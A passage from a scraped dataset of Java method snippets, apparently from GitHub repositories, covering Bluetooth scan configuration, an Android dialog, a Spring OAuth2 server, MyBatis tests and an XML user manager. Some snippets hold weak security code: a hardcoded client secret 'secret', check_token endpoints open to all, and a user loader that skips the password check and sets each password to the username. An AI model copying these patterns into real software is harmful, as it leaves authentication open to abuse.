mDeviceMac;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "BleScanRuleConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isAutoConnect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isAutoConnect() {        return mAutoConnect;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "BleScanRuleConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isFuzzy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isFuzzy() {        return mFuzzy;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "BleScanRuleConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getScanTimeOut", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getScanTimeOut() {        return mScanTimeOut;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "BleScanRuleConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setServiceUuids", "params": ["UUID"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setServiceUuids(UUID[] uuids) {            this.mServiceUuids = uuids;            return this;        }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setDeviceName", "params": ["boolean", "String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setDeviceName(boolean fuzzy, String... name) {            this.mFuzzy = fuzzy;            this.mDeviceNames = name;            return this;        }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setDeviceMac", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setDeviceMac(String mac) {            this.mDeviceMac = mac;            return this;        }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setAutoConnect", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setAutoConnect(boolean autoConnect) {            this.mAutoConnect = autoConnect;            return this;        }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setScanTimeOut", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setScanTimeOut(long timeOut) {            this.mTimeOut = timeOut;            return this;        }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "applyConfig", "params": ["BleScanRuleConfig"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "        void applyConfig(BleScanRuleConfig config) {            config.mServiceUuids = this.mServiceUuids;            config.mDeviceNames = this.mDeviceNames;            config.mDeviceMac = this.mDeviceMac;            config.mAutoConnect = this.mAutoConnect;            config.mFuzzy = this.mFuzzy;            config.mScanTimeOut = this.mTimeOut;        }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "build", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BleScanRuleConfig", "snippet": "        public BleScanRuleConfig build() {            BleScanRuleConfig config = new BleScanRuleConfig();            applyConfig(config);            return config;        }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "Builder", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setList", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setList(int... ids) {            List<String> data = new ArrayList<>(ids.length);            for (int id : ids) {                data.add(getString(id));            }            return setList(data);        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setList", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setList(String... data) {            return setList(Arrays.asList(data));        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setList", "params": ["List"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setList(List data) {            mAdapter.setData(data);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setSelect", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setSelect(int... positions) {            mAdapter.setSelect(positions);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setMaxSelect", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setMaxSelect(int count) {            mAdapter.setMaxSelect(count);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setMinSelect", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setMinSelect(int count) {            mAdapter.setMinSelect(count);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setSingleSelect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setSingleSelect() {            mAdapter.setSingleSelect();            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setListener", "params": ["OnListener"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setListener(OnListener listener) {            mListener = listener;            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(View v) {            switch (v.getId()) {                case R.id.tv_ui_confirm:                    HashMap<Integer, Object> data = mAdapter.getSelectSet();                    if (data.size() >= mAdapter.getMinSelect()) {                        autoDismiss();                        if (mListener != null) {                            mListener.onSelected(getDialog(), data);                        }                    } else {                        ToastUtils.show(String.format(getString(R.string.select_min_hint), mAdapter.getMinSelect()));                    }                    break;                case R.id.tv_ui_cancel:                    autoDismiss();                    if (mListener != null) {                        mListener.onCancel(getDialog());                    }                    break;                default:                    break;            }        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "        public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {            return new ViewHolder();        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "setSelect", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void setSelect(int... positions) {            for (int position : positions) {                mSelectSet.put(position, getItem(position));            }            notifyDataSetChanged();        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "setMaxSelect", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void setMaxSelect(int count) {            mMaxSelect = count;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "setMinSelect", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void setMinSelect(int count) {            mMinSelect = count;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "getMinSelect", "params": [], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "        private int getMinSelect() {            return mMinSelect;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "setSingleSelect", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void setSingleSelect() {            setMaxSelect(1);            setMinSelect(1);        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "isSingleSelect", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "        private boolean isSingleSelect() {            return mMaxSelect == 1 && mMinSelect == 1;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "getSelectSet", "params": [], "throws": null, "modifiers": ["private"], "return_type": "HashMap<Integer,Object>", "snippet": "        private HashMap<Integer, Object> getSelectSet() {            return mSelectSet;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "onItemClick", "params": ["RecyclerView", "View", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onItemClick(RecyclerView recyclerView, View itemView, int position) {            if (mSelectSet.containsKey(position)) {                // \u5f53\u524d\u5fc5\u987b\u4e0d\u662f\u5355\u9009\u6a21\u5f0f\u624d\u80fd\u53d6\u6d88\u9009\u4e2d                if (!isSingleSelect()) {                    mSelectSet.remove(position);                    notifyItemChanged(position);                }            } else {                if (mMaxSelect == 1) {                    mSelectSet.clear();                    notifyDataSetChanged();                }                if (mSelectSet.size() < mMaxSelect) {                    mSelectSet.put(position, getItem(position));                    notifyItemChanged(position);                } else {                    ToastUtils.show(String.format(getString(R.string.select_max_hint), mMaxSelect));                }            }        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "SelectAdapter", "extends": "MyAdapter", "implements": ["BaseAdapter"], "modifiers": ["private", "static", "final"]}}, {"method_name": "onBindView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void onBindView(int position) {                mTextView.setText(getItem(position).toString());                mCheckBox.setChecked(mSelectSet.containsKey(position));                if (mMaxSelect == 1) {                    mCheckBox.setClickable(false);                } else {                    mCheckBox.setEnabled(false);                }            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/SelectDialog.java", "stars": "1", "class": {"name": "ViewHolder", "extends": "MyAdapter", "implements": null, "modifiers": ["final"]}}, {"method_name": "clientDetailsService", "params": ["DataSource"], "throws": null, "modifiers": ["public"], "return_type": "ClientDetailsService", "snippet": "    public ClientDetailsService clientDetailsService(DataSource dataSource) {        ClientDetailsService clientDetailsService = new JdbcClientDetailsService(dataSource);        ((JdbcClientDetailsService) clientDetailsService).setPasswordEncoder(bCryptPasswordEncoder);        return clientDetailsService;    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_uaa/src/main/java/com/okhurley/uaa/config/AuthorizationServer.java", "stars": "2", "class": {"name": "AuthorizationServer", "extends": "AuthorizationServerConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "configure", "params": ["ClientDetailsServiceConfigurer"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void configure(ClientDetailsServiceConfigurer clients)            throws Exception {//        clients.withClientDetails(clientDetailsService);        clients.inMemory()// \u4f7f\u7528in-memory\u5b58\u50a8                .withClient(\"c1\")// client_id                .secret(bCryptPasswordEncoder.encode(\"secret\"))//\u5ba2\u6237\u7aef\u5bc6\u94a5                .resourceIds(\"res1\")//\u8d44\u6e90\u5217\u8868                .authorizedGrantTypes(\"authorization_code\", \"password\",\"client_credentials\",\"implicit\",\"refresh_token\")// \u8be5client\u5141\u8bb8\u7684\u6388\u6743\u7c7b\u578bauthorization_code,password,refresh_token,implicit,client_credentials                .scopes(\"all\")// \u5141\u8bb8\u7684\u6388\u6743\u8303\u56f4                .autoApprove(false)//false\u8df3\u8f6c\u5230\u6388\u6743\u9875\u9762                //\u52a0\u4e0a\u9a8c\u8bc1\u56de\u8c03\u5730\u5740                .redirectUris(\"http://www.baidu.com\");    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_uaa/src/main/java/com/okhurley/uaa/config/AuthorizationServer.java", "stars": "2", "class": {"name": "AuthorizationServer", "extends": "AuthorizationServerConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "tokenService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AuthorizationServerTokenServices", "snippet": "    public AuthorizationServerTokenServices tokenService() {        DefaultTokenServices service=new DefaultTokenServices();        service.setClientDetailsService(clientDetailsService);//\u5ba2\u6237\u7aef\u8be6\u60c5\u670d\u52a1        service.setSupportRefreshToken(true);//\u652f\u6301\u5237\u65b0\u4ee4\u724c        service.setTokenStore(tokenStore);//\u4ee4\u724c\u5b58\u50a8\u7b56\u7565        //\u4ee4\u724c\u589e\u5f3a        TokenEnhancerChain tokenEnhancerChain = new TokenEnhancerChain();        tokenEnhancerChain.setTokenEnhancers(Arrays.asList(jwtAccessTokenConverter));        service.setTokenEnhancer(tokenEnhancerChain);        service.setAccessTokenValiditySeconds(7200); // \u4ee4\u724c\u9ed8\u8ba4\u6709\u6548\u671f2\u5c0f\u65f6        service.setRefreshTokenValiditySeconds(259200); // \u5237\u65b0\u4ee4\u724c\u9ed8\u8ba4\u6709\u6548\u671f3\u5929        return service;    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_uaa/src/main/java/com/okhurley/uaa/config/AuthorizationServer.java", "stars": "2", "class": {"name": "AuthorizationServer", "extends": "AuthorizationServerConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "authorizationCodeServices", "params": ["DataSource"], "throws": null, "modifiers": ["public"], "return_type": "AuthorizationCodeServices", "snippet": "    public AuthorizationCodeServices authorizationCodeServices(DataSource dataSource) {        return new JdbcAuthorizationCodeServices(dataSource);//\u8bbe\u7f6e\u6388\u6743\u7801\u6a21\u5f0f\u7684\u6388\u6743\u7801\u5982\u4f55\u5b58\u53d6    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_uaa/src/main/java/com/okhurley/uaa/config/AuthorizationServer.java", "stars": "2", "class": {"name": "AuthorizationServer", "extends": "AuthorizationServerConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "configure", "params": ["AuthorizationServerEndpointsConfigurer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void configure(AuthorizationServerEndpointsConfigurer endpoints) {        endpoints                .authenticationManager(authenticationManager)//\u8ba4\u8bc1\u7ba1\u7406\u5668                .authorizationCodeServices(authorizationCodeServices)//\u6388\u6743\u7801\u670d\u52a1                .tokenServices(tokenService())//\u4ee4\u724c\u7ba1\u7406\u670d\u52a1                .allowedTokenEndpointRequestMethods(HttpMethod.POST);    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_uaa/src/main/java/com/okhurley/uaa/config/AuthorizationServer.java", "stars": "2", "class": {"name": "AuthorizationServer", "extends": "AuthorizationServerConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "configure", "params": ["AuthorizationServerSecurityConfigurer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void configure(AuthorizationServerSecurityConfigurer security){        security                .tokenKeyAccess(\"permitAll()\")                    //oauth/token_key\u662f\u516c\u5f00                .checkTokenAccess(\"permitAll()\")                  //oauth/check_token\u516c\u5f00                .allowFormAuthenticationForClients();\t\t\t  //\u8868\u5355\u8ba4\u8bc1\uff08\u7533\u8bf7\u4ee4\u724c\uff09    }", "url": "https://raw.githubusercontent.com/okhurley/oauth2/master/oauth2_uaa/src/main/java/com/okhurley/uaa/config/AuthorizationServer.java", "stars": "2", "class": {"name": "AuthorizationServer", "extends": "AuthorizationServerConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "applyDefaultValueWhenCustomizeDefaultValueSeparator", "params": [], "throws": ["IOException"], "modifiers": [], "return_type": "void", "snippet": "  void applyDefaultValueWhenCustomizeDefaultValueSeparator() throws IOException {    Properties props = new Properties();    props.setProperty(PropertyParser.KEY_ENABLE_DEFAULT_VALUE, \"true\");    props.setProperty(PropertyParser.KEY_DEFAULT_VALUE_SEPARATOR, \"?:\");    Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/global_variables_defaults/mybatis-config-custom-separator.xml\");    SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, props);    Configuration configuration = factory.getConfiguration();    configuration.addMapper(CustomDefaultValueSeparatorMapper.class);    SupportClasses.CustomCache cache = SupportClasses.Utils.unwrap(configuration.getCache(CustomDefaultValueSeparatorMapper.class.getName()));    Assertions.assertThat(configuration.getJdbcTypeForNull()).isEqualTo(JdbcType.NULL);    Assertions.assertThat(((UnpooledDataSource) configuration.getEnvironment().getDataSource()).getUrl())        .isEqualTo(\"jdbc:hsqldb:mem:global_variables_defaults\");    Assertions.assertThat(configuration.getDatabaseId()).isEqualTo(\"hsql\");    Assertions.assertThat(((SupportClasses.CustomObjectFactory) configuration.getObjectFactory()).getProperties().getProperty(\"name\"))        .isEqualTo(\"default\");    Assertions.assertThat(cache.getName()).isEqualTo(\"default\");    try (SqlSession sqlSession = factory.openSession()) {      CustomDefaultValueSeparatorMapper mapper = sqlSession.getMapper(CustomDefaultValueSeparatorMapper.class);      Assertions.assertThat(mapper.selectValue(null)).isEqualTo(\"default\");    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/global_variables_defaults/CustomizationTest.java", "stars": "15", "class": {"name": "CustomizationTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "applyPropertyValueWhenCustomizeDefaultValueSeparator", "params": [], "throws": ["IOException"], "modifiers": [], "return_type": "void", "snippet": "  void applyPropertyValueWhenCustomizeDefaultValueSeparator() throws IOException {    Properties props = new Properties();    props.setProperty(PropertyParser.KEY_ENABLE_DEFAULT_VALUE, \"true\");    props.setProperty(PropertyParser.KEY_DEFAULT_VALUE_SEPARATOR, \"?:\");    props.setProperty(\"settings:jdbcTypeForNull\", JdbcType.CHAR.name());    props.setProperty(\"db:name\", \"global_variables_defaults_custom\");    props.setProperty(\"productName:hsql\", \"Hsql\");    props.setProperty(\"objectFactory:name\", \"customObjectFactory\");    props.setProperty(\"cache:name\", \"customCache\");    Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/global_variables_defaults/mybatis-config-custom-separator.xml\");    SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(reader, props);    Configuration configuration = factory.getConfiguration();    configuration.addMapper(CustomDefaultValueSeparatorMapper.class);    SupportClasses.CustomCache cache = SupportClasses.Utils.unwrap(configuration.getCache(CustomDefaultValueSeparatorMapper.class.getName()));    Assertions.assertThat(configuration.getJdbcTypeForNull()).isEqualTo(JdbcType.CHAR);    Assertions.assertThat(((UnpooledDataSource) configuration.getEnvironment().getDataSource()).getUrl())        .isEqualTo(\"jdbc:hsqldb:mem:global_variables_defaults_custom\");    Assertions.assertThat(configuration.getDatabaseId()).isNull();    Assertions.assertThat(((SupportClasses.CustomObjectFactory) configuration.getObjectFactory()).getProperties().getProperty(\"name\"))         .isEqualTo(\"customObjectFactory\");    Assertions.assertThat(cache.getName()).isEqualTo(\"customCache\");    try (SqlSession sqlSession = factory.openSession()) {      CustomDefaultValueSeparatorMapper mapper = sqlSession.getMapper(CustomDefaultValueSeparatorMapper.class);      Assertions.assertThat(mapper.selectValue(\"3333\")).isEqualTo(\"3333\");    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/global_variables_defaults/CustomizationTest.java", "stars": "15", "class": {"name": "CustomizationTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "onBindDescription", "params": ["ViewHolder", "Object"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onBindDescription(ViewHolder viewHolder, Object item) {\t\tMedia itemWrapper = (Media) item;\t\tif (itemWrapper != null) {\t\t\tviewHolder.getTitle().setText(itemWrapper.title);\t\t\tviewHolder.getSubtitle().setText(itemWrapper.genre);\t\t\tif (itemWrapper instanceof Movie) {\t\t\t\tMovie movieItem = (Movie) itemWrapper;\t\t\t\tviewHolder.getBody().setText(movieItem.synopsis);\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/presenters/MovieDetailsDescriptionPresenter.java", "stars": "4", "class": {"name": "MovieDetailsDescriptionPresenter", "extends": "AbstractDetailsDescriptionPresenter", "implements": null, "modifiers": ["public"]}}, {"method_name": "parseXMLFile", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parseXMLFile() {    final File file = new File(this.xmlPath);    if (!file.exists()) {      throw new IllegalArgumentException(\"User xml file \" + this.xmlPath          + \" doesn't exist.\");    }    final HashMap<String, User> users = new HashMap<>();    final HashMap<String, String> userPassword = new HashMap<>();    final HashMap<String, Role> roles = new HashMap<>();    final HashMap<String, Set<String>> groupRoles =        new HashMap<>();    final HashMap<String, Set<String>> proxyUserMap =        new HashMap<>();    // Creating the document builder to parse xml.    final DocumentBuilderFactory docBuilderFactory = DocumentBuilderFactory.newInstance();    DocumentBuilder builder = null;    try {      // FIXME\u00a0Prevent XML External Entity (XXE) attacks.      XmlResolveUtils.avoidXEE(docBuilderFactory);      builder = docBuilderFactory.newDocumentBuilder();    } catch (final ParserConfigurationException e) {      throw new IllegalArgumentException(          \"Exception while parsing user xml. Document builder not created.\", e);    }    Document doc = null;    try {      doc = builder.parse(file);    } catch (final SAXException e) {      throw new IllegalArgumentException(\"Exception while parsing \" + this.xmlPath          + \". Invalid XML.\", e);    } catch (final IOException e) {      throw new IllegalArgumentException(\"Exception while parsing \" + this.xmlPath          + \". Error reading file.\", e);    }    // Only look at first item, because we should only be seeing    // azkaban-users tag.    final NodeList tagList = doc.getChildNodes();    final Node azkabanUsers = tagList.item(0);    final NodeList azkabanUsersList = azkabanUsers.getChildNodes();    for (int i = 0; i < azkabanUsersList.getLength(); ++i) {      final Node node = azkabanUsersList.item(i);      if (node.getNodeType() == Node.ELEMENT_NODE) {        if (node.getNodeName().equals(USER_TAG)) {          parseUserTag(node, users, userPassword, proxyUserMap);        } else if (node.getNodeName().equals(ROLE_TAG)) {          parseRoleTag(node, roles);        } else if (node.getNodeName().equals(GROUP_TAG)) {          parseGroupRoleTag(node, groupRoles);        }      }    }    // Synchronize the swap. Similarly, the gets are synchronized to this.    synchronized (this) {      this.users = users;      this.userPassword = userPassword;      this.roles = roles;      this.proxyUserMap = proxyUserMap;      this.groupRoles = groupRoles;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "parseUserTag", "params": ["Node", "HashMap<String,User>", "HashMap<String,String>", "HashMap<String,Set>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parseUserTag(final Node node, final HashMap<String, User> users,      final HashMap<String, String> userPassword,      final HashMap<String, Set<String>> proxyUserMap) {    final NamedNodeMap userAttrMap = node.getAttributes();    final Node userNameAttr = userAttrMap.getNamedItem(USERNAME_ATTR);    if (userNameAttr == null) {      throw new RuntimeException(\"Error loading user. The '\" + USERNAME_ATTR          + \"' attribute doesn't exist\");    }   /* final Node passwordAttr = userAttrMap.getNamedItem(PASSWORD_ATTR);    if (passwordAttr == null) {      throw new RuntimeException(\"Error loading user. The '\" + PASSWORD_ATTR          + \"' attribute doesn't exist\");    }*/    // Add user to the user/password map    final String username = userNameAttr.getNodeValue();    //final String password = passwordAttr.getNodeValue();    //userPassword.put(username, username);    userPassword.put(username, username);    // Add the user to the node    final User user = new User(userNameAttr.getNodeValue());    users.put(username, user);    logger.info(\"Loading user \" + user.getUserId());    final Node roles = userAttrMap.getNamedItem(ROLES_ATTR);    if (roles != null) {      final String value = roles.getNodeValue();      final String[] roleSplit = value.split(\"\\\\s*,\\\\s*\");      for (final String role : roleSplit) {        user.addRole(role);      }    }    final Node proxy = userAttrMap.getNamedItem(PROXY_ATTR);    if (proxy != null) {      final String value = proxy.getNodeValue();      //\u7a7a\u5b57\u7b26\u4e32\u4e0d\u505a\u5904\u7406      if(org.apache.commons.lang.StringUtils.isNotEmpty(value)){        final String[] proxySplit = value.split(\"\\\\s*,\\\\s*\");        for (final String proxyUser : proxySplit) {          Set<String> proxySet = proxyUserMap.get(username);          if (proxySet == null) {            proxySet = new HashSet<>();            proxyUserMap.put(username, proxySet);          }          //\u628a\u4ee3\u7406\u7528\u6237\u6dfb\u52a0\u5230User\u5bf9\u8c61\u4e2d          user.addProxyUser(proxyUser);          proxySet.add(proxyUser);        }      }    }    final Node groups = userAttrMap.getNamedItem(GROUPS_ATTR);    if (groups != null) {      final String value = groups.getNodeValue();      final String[] groupSplit = value.split(\"\\\\s*,\\\\s*\");      for (final String group : groupSplit) {        user.addGroup(group);      }    }    final Node emailAttr = userAttrMap.getNamedItem(EMAIL_ATTR);    if (emailAttr != null) {      user.setEmail(emailAttr.getNodeValue());    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/user/WebankXmlUserManager.java", "stars": "18", "class": {"name": "WebankXmlUserManager", "extends": null, "implements": ["UserManager"], "modifiers": ["public"]}}, {"method_name": "parseRoleTag", "params": ["Node", "HashMap<String,Role>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parseRoleTag(final Node node, final HashMap<String, 